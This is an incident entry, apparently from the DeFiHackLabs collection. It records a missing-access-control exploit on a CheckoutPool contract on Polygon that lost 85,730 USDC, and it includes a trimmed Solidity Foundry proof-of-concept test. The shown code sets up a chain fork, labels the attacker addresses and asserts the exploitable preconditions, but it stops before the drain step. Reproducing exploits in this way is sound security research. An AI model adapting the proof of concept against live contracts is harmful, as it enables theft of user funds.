# [?] unverified - CheckoutPool Old BOC Missing Access Control

## Summary
Severity: Unknown
Chain: Polygon
Component: unverified_1304
Published: 2026-03-16
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/unverified_1304_exp.sol
Type: defi-exploit-poc

## Details
Lost: 85,730 USDC

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    IERC20 private constant usdc = IERC20(USDC_TOKEN);
    IOldBridgeOperator private constant oldBoc = IOldBridgeOperator(OLD_BOC);
    ICheckoutPool private constant checkoutPool = ICheckoutPool(CHECKOUT_POOL);
    ICheckoutPaymaster private constant paymaster = ICheckoutPaymaster(CHECKOUT_PAYMASTER);
    IEntryPoint private constant entryPoint = IEntryPoint(ENTRY_POINT);

    function setUp() public {
        uint256 forkBlock = 84_291_586;
        vm.createSelectFork("polygon", forkBlock);
        fundingToken = USDC_TOKEN;

        vm.label(TX_SENDER, "Transaction sender");
        vm.label(ATTACK_CONTRACT, "Attack contract / deposit address");
        vm.label(ATTACK_ACCOUNT, "Attacker smart account");
        vm.label(OLD_BOC, "Old CheckoutPool BOC");
        vm.label(CHECKOUT_POOL, "CheckoutPool");
        vm.label(CHECKOUT_PAYMASTER, "CheckoutPaymaster");
        vm.label(ENTRY_POINT, "ERC-4337 EntryPoint");
        vm.label(USDC_TOKEN, "USDC");
    }

    function testExploit() public balanceLog2(ATTACK_ACCOUNT) {
        UserOperation[] memory ops = _buildObservedUserOp();
        CheckoutState memory checkoutBefore = checkoutPool.getCheckout(ATTACK_CONTRACT);
        uint256 attackerUsdcBefore = usdc.balanceOf(ATTACK_ACCOUNT);
        uint256 poolUsdcBefore = usdc.balanceOf(CHECKOUT_POOL);
        uint256 excessBefore = checkoutPool._POOL_EXCESS_(USDC_TOKEN);

        uint256 executionAmount = uint256(checkoutBefore.params.targetAmount);
        uint256 heldAmount = checkoutBefore.heldAmount;
        uint256 excessSpend = executionAmount - heldAmount;

        assertTrue(oldBoc._ALLOW_ALL_(), "old BOC allow-all disabled");
        assertTrue(paymaster.isOperatorAllowed(OLD_BOC), "old BOC is not paymaster operator");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/unverified_1304_exp.sol_
